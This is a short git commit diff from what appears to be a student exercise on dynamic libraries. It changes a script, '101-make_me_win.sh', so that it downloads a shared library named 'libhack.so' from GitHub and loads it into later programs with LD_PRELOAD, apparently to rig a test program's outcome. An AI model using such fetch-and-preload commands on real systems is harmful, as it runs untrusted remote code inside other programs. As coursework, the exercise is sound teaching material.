a0db4b041747edc4e628cadc5db0c258c5f7a41b
root <root@MAMBA.localdomain>
2023-03-21 09:14:33 +0300

    new

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-wget -P ../ 
+wget -P ../ https://github.com/TeddyMuli/alx-low_level_programming/blob/2eae79d9d8f8a4aa550b139f3b048bf245adfe9f/0x18-dynamic_libraries/libhack.so
+export LD_PRELOAD=../libhack.so
